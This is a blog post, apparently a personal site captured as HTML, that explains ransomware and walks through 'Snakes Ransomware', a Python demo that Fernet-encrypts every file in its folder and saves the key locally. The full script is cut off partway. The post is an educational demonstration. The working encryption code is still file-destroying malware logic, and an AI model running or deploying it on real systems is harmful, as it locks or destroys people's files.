@@ -1,0 +1,389 @@
+<!DOCTYPE html><html lang="en" class="antialiased break-words"> <head><meta charset="utf-8"><link rel="icon" href="/krishnaprofile.png"><meta name="viewport" content="width=device-width"><meta name="generator" content="Astro v5.16.6"><link rel="sitemap" href="/sitemap-index.xml"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Sigmar&family=Kanit:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&family=Comfortaa:wght@300;400;500;600;700&display=swap" rel="stylesheet"><link rel="alternate" type="application/rss+xml" title="Krishna - RSS Feed" href="https://krishnaethamukkala.me/rss.xml"><title>Krishna | Understanding Ransomware and a Dive into Snakes Ransomware</title><link rel="stylesheet" href="/_astro/about.sL8BeR5a.css">
+<link rel="stylesheet" href="/_astro/_id_.Q6WbBd0V.css">
+<style>:where([data-astro-image]){object-fit:var(--fit);object-position:var(--pos);height:auto}:where([data-astro-image=full-width]){width:100%}:where([data-astro-image=constrained]){max-width:100%}
+</style><script type="module" src="/_astro/page.wAe9HRgw.js"></script></head> <body> <div class="background-stickers fixed inset-0 pointer-events-none overflow-hidden z-0" aria-hidden="true" data-astro-cid-m2yp7btv> <span class="sticker sigmar-ff" style="position: absolute; top: 8%; left: 3%; transform: rotate(-18deg); opacity: 0.025; font-size: clamp(2rem, 4vw, 4rem); color: currentColor;" data-astro-cid-m2yp7btv> クリシュナ </span><span class="sticker sigmar-ff" style="position: absolute; top: 18%; right: 6%; transform: rotate(15deg); opacity: 0.03; font-size: clamp(1.8rem, 3.5vw, 3.5rem); color: currentColor;" data-astro-cid-m2yp7btv> Κρίσνα </span><span class="sticker sigmar-ff" style="position: absolute; top: 32%; left: 1%; transform: rotate(-12deg); opacity: 0.02; font-size: clamp(2.5rem, 5vw, 5rem); color: currentColor;" data-astro-cid-m2yp7btv> कृष्ण </span><span class="sticker sigmar-ff" style="position: absolute; top: 48%; right: 10%; transform: rotate(20deg); opacity: 0.028; font-size: clamp(1.5rem, 3vw, 3rem); color: currentColor;" data-astro-cid-m2yp7btv> Кришна </span><span class="sticker sigmar-ff" style="position: absolute; top: 62%; left: 5%; transform: rotate(-25deg); opacity: 0.025; font-size: clamp(2.2rem, 4.5vw, 4.5rem); color: currentColor;" data-astro-cid-m2yp7btv> كريشنا </span><span class="sticker sigmar-ff" style="position: absolute; top: 73%; right: 3%; transform: rotate(8deg); opacity: 0.02; font-size: clamp(1.9rem, 3.8vw, 3.8rem); color: currentColor;" data-astro-cid-m2yp7btv> Krishna </span><span class="sticker sigmar-ff" style="position: absolute; top: 12%; left: 42%; transform: rotate(28deg); opacity: 0.018; font-size: clamp(2.1rem, 4.2vw, 4.2rem); color: currentColor;" data-astro-cid-m2yp7btv> Krishna </span><span class="sticker sigmar-ff" style="position: absolute; top: 38%; left: 48%; transform: rotate(-20deg); opacity: 0.028; font-size: clamp(1.6rem, 3.2vw, 3.2rem); color: currentColor;" data-astro-cid-m2yp7btv> Krishna </span><span class="sticker sigmar-ff" style="position: absolute; top: 58%; left: 38%; transform: rotate(18deg); opacity: 0.022; font-size: clamp(2.4rem, 4.8vw, 4.8rem); color: currentColor;" data-astro-cid-m2yp7btv> Krishna </span><span class="sticker sigmar-ff" style="position: absolute; top: 78%; left: 32%; transform: rotate(-14deg); opacity: 0.025; font-size: clamp(1.75rem, 3.5vw, 3.5rem); color: currentColor;" data-astro-cid-m2yp7btv> ක්‍රිෂ්ණ </span><span class="sticker sigmar-ff" style="position: absolute; top: 22%; right: 22%; transform: rotate(22deg); opacity: 0.018; font-size: clamp(2.25rem, 4.5vw, 4.5rem); color: currentColor;" data-astro-cid-m2yp7btv> కృష్ణ </span><span class="sticker sigmar-ff" style="position: absolute; top: 52%; right: 28%; transform: rotate(-28deg); opacity: 0.028; font-size: clamp(1.8rem, 3.6vw, 3.6rem); color: currentColor;" data-astro-cid-m2yp7btv> 크리슈나 </span><span class="sticker sigmar-ff" style="position: absolute; top: 68%; right: 18%; transform: rotate(10deg); opacity: 0.022; font-size: clamp(2rem, 4vw, 4rem); color: currentColor;" data-astro-cid-m2yp7btv> କୃଷ୍ଣ </span><span class="sticker sigmar-ff" style="position: absolute; top: 3%; left: 22%; transform: rotate(-22deg); opacity: 0.025; font-size: clamp(1.7rem, 3.4vw, 3.4rem); color: currentColor;" data-astro-cid-m2yp7btv> Krishna </span><span class="sticker sigmar-ff" style="position: absolute; top: 43%; left: 12%; transform: rotate(24deg); opacity: 0.022; font-size: clamp(2.15rem, 4.3vw, 4.3rem); color: currentColor;" data-astro-cid-m2yp7btv> Krishna </span><span class="sticker sigmar-ff" style="position: absolute; top: 83%; left: 18%; transform: rotate(-11deg); opacity: 0.028; font-size: clamp(1.85rem, 3.7vw, 3.7rem); color: currentColor;" data-astro-cid-m2yp7btv> Krishna </span><span class="sticker sigmar-ff" style="position: absolute; top: 28%; right: 12%; transform: rotate(16deg); opacity: 0.018; font-size: clamp(2.3rem, 4.6vw, 4.6rem); color: currentColor;" data-astro-cid-m2yp7btv> Krishna </span><span class="sticker sigmar-ff" style="position: absolute; top: 88%; right: 6%; transform: rotate(-19deg); opacity: 0.025; font-size: clamp(1.65rem, 3.3vw, 3.3rem); color: currentColor;" data-astro-cid-m2yp7btv> கிருஷ்ணா </span><span class="sticker sigmar-ff" style="position: absolute; top: 15%; left: 30%; transform: rotate(-16deg); opacity: 0.02; font-size: clamp(2rem, 4vw, 4rem); color: currentColor;" data-astro-cid-m2yp7btv> 克里希纳 </span><span class="sticker sigmar-ff" style="position: absolute; top: 35%; right: 35%; transform: rotate(26deg); opacity: 0.025; font-size: clamp(1.9rem, 3.8vw, 3.8rem); color: currentColor;" data-astro-cid-m2yp7btv> କୃଷ୍ଣ </span><span class="sticker sigmar-ff" style="position: absolute; top: 55%; left: 28%; transform: rotate(-14deg); opacity: 0.022; font-size: clamp(2.2rem, 4.4vw, 4.4rem); color: currentColor;" data-astro-cid-m2yp7btv> కృష్ణ </span><span class="sticker sigmar-ff" style="position: absolute; top: 85%; left: 45%; transform: rotate(19deg); opacity: 0.028; font-size: clamp(1.7rem, 3.4vw, 3.4rem); color: currentColor;" data-astro-cid-m2yp7btv> कृष्ण </span><span class="sticker sigmar-ff" style="position: absolute; top: 5%; right: 40%; transform: rotate(-24deg); opacity: 0.018; font-size: clamp(2.1rem, 4.2vw, 4.2rem); color: currentColor;" data-astro-cid-m2yp7btv> Krishna </span><span class="sticker sigmar-ff" style="position: absolute; top: 25%; left: 60%; transform: rotate(13deg); opacity: 0.025; font-size: clamp(1.8rem, 3.6vw, 3.6rem); color: currentColor;" data-astro-cid-m2yp7btv> Krishna </span> </div>  <main class="max-w-3xl mx-auto min-h-screen relative z-10"> <header data-astro-cid-dmqpwcec> <nav class="font-light w-full" data-astro-cid-dmqpwcec> <a href="/" data-astro-cid-dmqpwcec><div class="flex items-center gap-2"> <img src="/krishnaprofile.png" alt="Logo" loading="eager" decoding="async" fetchpriority="auto" width="32" height="32"> <span class="sigmar-ff text-base">Krishna</span> </div></a> <div class="hidden sm:flex sm:gap-8" data-astro-cid-dmqpwcec> <a class href="/">Home</a><a class href="/blog">Blog</a><a class href="/projects">Projects</a><a class href="/about">About</a><a class href="/contact">Contact</a> </div> <button class="button-link p-1! aspect-square border-gray-500 hover:border-space-red dark:hover:border-space-yellow hover:text-space-red dark:hover:text-space-yellow portrait:ml-auto" id="themeToggle" title="Click to switch Theme" data-astro-cid-dz5h74bc="true"> <img src="/_astro/moon.BaCs20tM_Z1cKeQz.svg" alt="Moon Icon" data-astro-cid-dz5h74bc="true" loading="lazy" decoding="async" fetchpriority="auto" width="20" height="20" class="moon"> <img src="/_astro/sun.pGfvkfjL_Z1cKeQz.svg" alt="Sun Icon" data-astro-cid-dz5h74bc="true" loading="lazy" decoding="async" fetchpriority="auto" width="20" height="20" class="sun"> </button>  <script>
+  theme =
+    localStorage?.getItem("theme") ||
+    (window.matchMedia("(prefers-color-scheme: dark)").matches
+      ? "dark"
+      : "light");
+
+  if (theme === "light") {
+    document.documentElement.classList.add("light");
+    document.documentElement.classList.remove("dark");
+  } else {
+    document.documentElement.classList.add("dark");
+    document.documentElement.classList.remove("light");
+  }
+
+  localStorage.setItem("theme", theme);
+
+  handleToggleClick = () => {
+    const element = document.documentElement;
+    element.classList.toggle("light");
+    element.classList.toggle("dark");
+
+    const isDark = element.classList.contains("dark");
+    localStorage.setItem("theme", isDark ? "dark" : "light");
+  };
+
+  document
+    .getElementById("themeToggle")
+    .addEventListener("click", handleToggleClick);
+</script> <span id="hamburger-menu" class="relative top-[-2px] block text-xl leading-none sm:hidden" title="Menu">🍔</span> </nav> <div id="mobile-links" class="font-light animated h-0 m-0 opacity-0 top-0 w-full" data-astro-cid-dmqpwcec> <span class="close-menu" data-astro-cid-dmqpwcec>❌</span> <a class="close-menu" href="/">Home</a><a class="close-menu" href="/blog">Blog</a><a class="close-menu" href="/projects">Projects</a><a class="close-menu" href="/about">About</a><a class="close-menu" href="/contact">Contact</a> </div> </header> <script>
+  document.querySelector("#hamburger-menu").addEventListener("click", () => {
+    console.log("clicked...");
+    document.querySelector("#mobile-links").classList.remove("slideOutUp");
+    document.querySelector("#mobile-links").classList.add("expanded");
+    document.querySelector("#mobile-links").classList.add("slideInDown");
+  });
+
+  document.querySelector(".close-menu").addEventListener("click", () => {
+    console.log("clicked...");
+    document.querySelector("#mobile-links").classList.add("slideOutUp");
+    document.querySelector("#mobile-links").classList.add("expanded");
+    document.querySelector("#mobile-links").classList.remove("slideInDown");
+  });
+</script>   <div class="blog-background" data-emoji="❤️" data-astro-cid-gdv4mkhl> <div class="background-element" style="
+          left: 53.87208132286687%;
+          top: 82.07992301257418%;
+          --rotation: 192.56826601740156deg;
+          --scale: 0.7771103239145922;
+          --delay: 0.5823152218708447s;
+          --duration: 23.309315961805368s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 88.92669408974344%;
+          top: 13.086433269400132%;
+          --rotation: 348.1372208041098deg;
+          --scale: 0.7745575040576482;
+          --delay: 1.4362944083121176s;
+          --duration: 26.708158794008646s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 20.6072561814604%;
+          top: 20.445450170669144%;
+          --rotation: 41.76929485667501deg;
+          --scale: 0.6437828398379494;
+          --delay: 1.392561104016219s;
+          --duration: 28.53629762651036s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 23.246085504244007%;
+          top: 28.934820512812664%;
+          --rotation: 336.47718231221336deg;
+          --scale: 0.8260589028248442;
+          --delay: 1.3957631811480384s;
+          --duration: 25.338707765021393s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 39.74648107667922%;
+          top: 75.52182880427505%;
+          --rotation: 180.37963530692852deg;
+          --scale: 0.937379082511274;
+          --delay: 0.07554490187505047s;
+          --duration: 22.344073691172454s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 63.06304087022747%;
+          top: 82.57477647104817%;
+          --rotation: 182.42814811227484deg;
+          --scale: 0.89931112055388;
+          --delay: 0.1921377873873471s;
+          --duration: 29.6773532808045s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 3.4047872071555796%;
+          top: 79.09118185990691%;
+          --rotation: 78.41658885527659deg;
+          --scale: 0.9601558491128954;
+          --delay: 0.5506724675885568s;
+          --duration: 27.513951511805217s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 93.39947445529712%;
+          top: 99.9583222273155%;
+          --rotation: 268.7732514518366deg;
+          --scale: 0.8330844225503758;
+          --delay: 1.0868920794287806s;
+          --duration: 23.142732746345263s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 64.73775361124696%;
+          top: 19.460413051881954%;
+          --rotation: 109.7944816616242deg;
+          --scale: 0.9523555054795486;
+          --delay: 0.3150242190472934s;
+          --duration: 26.474216489265505s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 24.355250336127952%;
+          top: 34.22782181221342%;
+          --rotation: 320.86577887341787deg;
+          --scale: 0.888141461995666;
+          --delay: 0.3954893361492733s;
+          --duration: 29.041686567973123s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 92.72815820240568%;
+          top: 94.24474217557123%;
+          --rotation: 198.01086470817106deg;
+          --scale: 0.6710550726791848;
+          --delay: 0.5078127948027071s;
+          --duration: 28.505020987997575s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 48.623150993621714%;
+          top: 34.70922694986134%;
+          --rotation: 47.073370008281366deg;
+          --scale: 0.6038638647292015;
+          --delay: 0.4906941125421955s;
+          --duration: 20.820645288116474s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 95.99776131694573%;
+          top: 45.53534483152566%;
+          --rotation: 111.64284347949199deg;
+          --scale: 0.7924474521428848;
+          --delay: 1.275196217729024s;
+          --duration: 23.452985884908276s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 52.578170869374794%;
+          top: 22.518156811165714%;
+          --rotation: 147.25657261745326deg;
+          --scale: 0.710856997108788;
+          --delay: 1.1650773921980355s;
+          --duration: 20.98714445991835s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 1.1385841931026874%;
+          top: 8.580637646095735%;
+          --rotation: 14.4988252201607deg;
+          --scale: 0.8562500133868198;
+          --delay: 1.8247580436641622s;
+          --duration: 25.5154010682638s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 62.81542228518377%;
+          top: 54.93614232944495%;
+          --rotation: 267.4344761242599deg;
+          --scale: 0.6638807401609667;
+          --delay: 1.3634533420190151s;
+          --duration: 24.079848444496932s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 95.39365417559122%;
+          top: 68.95628183917846%;
+          --rotation: 157.11917644927598deg;
+          --scale: 0.7920829494091308;
+          --delay: 0.9931170047621944s;
+          --duration: 27.06812344959062s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 72.31454212434333%;
+          top: 18.36911602145863%;
+          --rotation: 248.96037281839588deg;
+          --scale: 0.7279487718107573;
+          --delay: 1.7106385873403789s;
+          --duration: 22.154096049203254s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 88.56088539783215%;
+          top: 23.12501588040259%;
+          --rotation: 269.70729158755245deg;
+          --scale: 0.690763536448921;
+          --delay: 1.6580088890637494s;
+          --duration: 23.382534648856137s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 60.7935543697596%;
+          top: 9.704969354464431%;
+          --rotation: 222.29157464144572deg;
+          --scale: 0.7252998526831177;
+          --delay: 1.1559589106945078s;
+          --duration: 29.451112981003504s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 33.20274302898263%;
+          top: 8.686383962328016%;
+          --rotation: 58.32540410707821deg;
+          --scale: 0.7039959329870327;
+          --delay: 1.2669054543823552s;
+          --duration: 26.635288342262307s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 35.904892567739836%;
+          top: 51.766806407654585%;
+          --rotation: 68.36675851678642deg;
+          --scale: 0.9526993679785318;
+          --delay: 0.06529563317571219s;
+          --duration: 20.786021938527735s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 45.32293684963775%;
+          top: 48.31619391500428%;
+          --rotation: 337.3418516479838deg;
+          --scale: 0.6667353495314954;
+          --delay: 0.8979921104713662s;
+          --duration: 21.05038673921513s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 82.227228714018%;
+          top: 14.75865755562651%;
+          --rotation: 245.5535467063416deg;
+          --scale: 0.7788901003391333;
+          --delay: 1.1077878536822379s;
+          --duration: 22.920016895336914s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div><div class="background-element" style="
+          left: 35.87791190460283%;
+          top: 85.31318658474207%;
+          --rotation: 9.03644931375089deg;
+          --scale: 0.6984848774882112;
+          --delay: 1.3328064592309437s;
+          --duration: 21.198534421570805s;
+        " data-astro-cid-gdv4mkhl> <span class="emoji-text" data-astro-cid-gdv4mkhl>❤️</span> </div> </div>  <div class="page-content" data-astro-cid-gsbvazvt> <h1 class="sigmar-ff blog-post-title" data-astro-cid-gsbvazvt>Understanding Ransomware and a Dive into Snakes Ransomware</h1> <div class="blog-meta" data-astro-cid-gsbvazvt> <span class="blog-meta-emoji" data-astro-cid-gsbvazvt>❤️</span> <span class="blog-author comfortaa-regular" data-astro-cid-gsbvazvt> <span class="blog-author-name" data-astro-cid-gsbvazvt>Krishna Chaitanya</span> </span> <span class="blog-date comfortaa-regular" data-astro-cid-gsbvazvt> May 14, 2022 </span> </div>  <div class="blog-content comfortaa-regular" data-astro-cid-gsbvazvt> <h2 id="what-is-ransomware">What is Ransomware?</h2>
+<p>Ransomware is a type of malicious software designed to block access to a computer system or encrypt its data until a sum of money, or ransom, is paid. It’s a form of cyber extortion that has become increasingly prevalent, targeting individuals, businesses, and even government organizations. Once infected, victims are often left with a grim choice: pay the ransom to regain access to their files or risk losing them forever.</p>
+<h3 id="how-ransomware-works">How Ransomware Works</h3>
+<p>Ransomware typically spreads through phishing emails, malicious websites, or software vulnerabilities. When the malware is executed, it begins encrypting files on the victim’s system, rendering them inaccessible. A ransom note is then displayed, demanding payment in exchange for the decryption key.</p>
+<p>The use of ransomware has evolved over the years, with cybercriminals employing more sophisticated techniques to avoid detection and increase their chances of receiving payment. Unfortunately, even after paying the ransom, there’s no guarantee that the files will be restored.</p>
+<h2 id="introduction-to-snakes-ransomware">Introduction to Snakes Ransomware</h2>
+<p>Snakes Ransomware is a Python-based tool I’ve developed to demonstrate the encryption and decryption processes involved in ransomware. While this project is intended purely for educational purposes, it highlights the mechanics of ransomware in a controlled environment.</p>
+<h3 id="features-of-snakes-ransomware">Features of Snakes Ransomware</h3>
+<ul>
+<li><strong>File Encryption:</strong> Encrypts all files in a specified folder.</li>
+<li><strong>Key Generation:</strong> Creates a unique key for each encryption process, which is crucial for decryption.</li>
+<li><strong>File Decryption:</strong> Provides a way to decrypt the previously encrypted files using the generated key.</li>
+</ul>
+<h2 id="how-to-use-snakes-ransomware">How to Use Snakes Ransomware</h2>
+<h3 id="step-1-installation">Step 1: Installation</h3>
+<p>First, ensure you have all the required dependencies installed. You can do this by running the following command in your terminal:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">pip</span><span style="color:#9ECBFF"> install</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> requirements.txt</span></span></code></pre>
+<h3 id="step-2-encryption-process">Step 2: Encryption Process</h3>
+<p>To encrypt files within a target folder:</p>
+<ol>
+<li>
+<p><strong>Copy the Encryption Script:</strong></p>
+<ul>
+<li>Place the <code>snakes-encrypt.py</code> file into the folder you want to encrypt.</li>
+</ul>
+</li>
+<li>
+<p><strong>Execute the Script:</strong></p>
+<ul>
+<li>
+<p>Open a terminal and navigate to the folder containing the script.</p>
+</li>
+<li>
+<p>Run the following command:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">python</span><span style="color:#9ECBFF"> snakes-encrypt.py</span></span></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Encryption Completion:</strong></p>
+<ul>
+<li>After execution, all files in the folder will be encrypted, and a key file named <code>snakes-key.key</code> will be generated. This key is essential for decrypting the files.</li>
+</ul>
+</li>
+</ol>
+<h3 id="step-3-decryption-process">Step 3: Decryption Process</h3>
+<p>To decrypt the files:</p>
+<ol>
+<li>
+<p><strong>Copy the Decryption Script:</strong></p>
+<ul>
+<li>Place the <code>snakes-decrypt.py</code> file in the folder containing the encrypted files.</li>
+</ul>
+</li>
+<li>
+<p><strong>Add the Encryption Key:</strong></p>
+<ul>
+<li>Ensure the <code>snakes-key.key</code> file is in the same directory as the decryption script.</li>
+</ul>
+</li>
+<li>
+<p><strong>Execute the Decryption Script:</strong></p>
+<ul>
+<li>
+<p>Run the following command in your terminal:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">python</span><span style="color:#9ECBFF"> snakes-decrypt.py</span></span></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Decryption Completion:</strong></p>
+<ul>
+<li>The encrypted files will be restored to their original state.</li>
+</ul>
+</li>
+</ol>
+<h2 id="how-snakes-ransomware-was-created">How Snakes Ransomware Was Created</h2>
+<p>Creating Snakes Ransomware involved a deep dive into cryptography and file handling in Python. The key aspects of the program include:</p>
+<h3 id="encryption-script-explanation"><strong>Encryption Script Explanation</strong></h3>
+<p>This script is designed to encrypt all files in the current directory, except for the encryption script itself and the key file.</p>
+<h4 id="1-importing-necessary-libraries"><strong>1. Importing Necessary Libraries:</strong></h4>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> os</span></span>
+<span class="line"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> cryptography.fernet </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> Fernet</span></span></code></pre>
+<ul>
+<li><code>os</code>: Used to interact with the operating system for file operations.</li>
+<li><code>cryptography.fernet</code>: A symmetric encryption method from the <code>cryptography</code> library, which is used to encrypt and decrypt files.</li>
+</ul>
+<h4 id="2-listing-files-to-encrypt"><strong>2. Listing Files to Encrypt:</strong></h4>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">files </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> []</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">for</span><span style="color:#FFAB70"> file</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> os.listdir():</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#FFAB70"> file</span><span style="color:#F97583"> ==</span><span style="color:#9ECBFF"> "snakes-encrypt.py"</span><span style="color:#F97583"> or</span><span style="color:#FFAB70"> file</span><span style="color:#F97583"> ==</span><span style="color:#9ECBFF"> "snakes-key.key"</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#F97583">        continue</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> os.path.isfile(</span><span style="color:#FFAB70">file</span><span style="color:#E1E4E8">):</span></span>
+<span class="line"><span style="color:#E1E4E8">        files.append(</span><span style="color:#FFAB70">file</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(files)</span></span></code></pre>
+<ul>
+<li>The script lists all files in the current directory.</li>
+<li>It excludes the encryption script (<code>snakes-encrypt.py</code>) and the key file (<code>snakes-key.key</code>) to prevent them from being encrypted.</li>
+</ul>
+<h4 id="3-generating-the-encryption-key"><strong>3. Generating the Encryption Key:</strong></h4>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">key </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Fernet.generate_key()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"snakes-key.key"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"wb"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> thekey:</span></span>
+<span class="line"><span style="color:#E1E4E8">    thekey.write(key)</span></span></code></pre>
+<ul>
+<li>A new encryption key is generated using <code>Fernet.generate_key()</code>.</li>
+<li>This key is saved in a file called <code>snakes-key.key</code>. This key is essential for decrypting the files later.</li>
+</ul>
+<h4 id="4-encrypting-the-files"><strong>4. Encrypting the Files:</strong></h4>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">for</span><span style="color:#FFAB70"> file</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> files:</span></span>
+<span class="line"><span style="color:#F97583">    with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">file</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"rb"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> thefile:</span></span>
+<span class="line"><span style="color:#E1E4E8">        contents </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> thefile.read()</span></span>
+<span class="line"><span style="color:#E1E4E8">    contents_encrypted </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Fernet(key).encrypt(contents)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">    with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">file</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"wb"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> thefile:</span></span>
+<span class="line"><span style="color:#E1E4E8">        thefile.write(contents_encrypted)</span></span></code></pre>
+<ul>
+<li>The script loops through each file in the <code>files</code> list.</li>
+<li>It reads the contents of each file in binary mode (<code>"rb"</code>).</li>
+<li>The contents are encrypted using the generated key.</li>
+<li>The encrypted contents are then written back to the original file in binary mode (<code>"wb"</code>), replacing the original contents with the encrypted data.</li>
+</ul>
+<h3 id="complete-encryption-script"><strong>Complete Encryption Script</strong></h3>
+<p>Here’s the complete encryption script with comments for clarity:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#6A737D">#!/usr/bin/env python3</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> os</span></span>
+<span class="line"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> cryptography.fernet </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> Fernet</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># List of files to be encrypted</span></span>
+<span class="line"><span style="color:#E1E4E8">files </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> []</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Identify files to encrypt, excluding the script and key files</span></span>
+<span class="line"><span style="color:#F97583">for</span><span style="color:#FFAB70"> file</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> os.listdir():</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#FFAB70"> file</span><span style="color:#F97583"> ==</span><span style="color:#9ECBFF"> "snakes-encrypt.py"</span><span style="color:#F97583"> or</span><span style="color:#FFAB70"> file</span><span style="color:#F97583"> ==</span><span style="color:#9ECBFF"> "snakes-key.key"</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#F97583">        continue</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> os.path.isfile(</span><span style="color:#FFAB70">file</span><span style="color:#E1E4E8">):</span></span>
+<span class="line"><span style="color:#E1E4E8">        files.append(</span><span style="color:#FFAB70">file</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Files to be encrypted:"</span><span style="color:#E1E4E8">, files)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Generate encryption key and save it to a file</span></span>
